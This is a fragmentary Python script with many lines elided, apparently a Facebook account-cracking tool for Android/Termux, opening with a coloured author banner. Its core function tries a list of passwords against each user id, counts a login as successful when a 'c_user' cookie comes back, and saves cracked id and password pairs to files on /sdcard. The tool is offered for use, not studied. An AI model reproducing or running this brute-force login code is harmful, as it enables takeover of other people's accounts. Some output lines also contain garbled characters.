...
#os.system("xdg-open https://github.com/Nasimblog")
...
\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1m𝐀𝐮𝐭𝐡𝐨𝐫    \033[38;5;196m: \033[1;92mNASIM MIA     \033[38;5;46m                   ▊

\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1m𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤  \033[38;5;196m: \033[1;92mMD NASIM MIA  \033[38;5;46m                   ▊

\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1m𝐆𝐢𝐭𝐡𝐮𝐛    \033[38;5;196m: \033[1;92mhttps://github.com/Nasimblog-404     \033[38;5;46m ▊
...
\033[92;1m ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
               ...
               \033[97;1mGIFT BY\033[38;5;196m : \033[1;92mZUBAIR SAMI
...
def admin():
	...
	if bal =='1':
		...
		os.system('xdg-open https://www.facebook.com/mdnasimmia44');time.sleep(1)

		admin()

	if bal =='2':

		os.system('xdg-open https://github.com/Nasimblog');time.sleep(1)
...
def a(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93m NASIM \033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/SAMI_xd-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                ...
                open('/sdcard/SAMI_xd-CP.txt', 'a').write( uid+' | '+ps+' \n')
        ...
        sys.stdout.write(f" \r{R} [{B} NASIM{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/SAMI_xd-ok.txt', 'a').write(cid+' | '+ps+'\n')
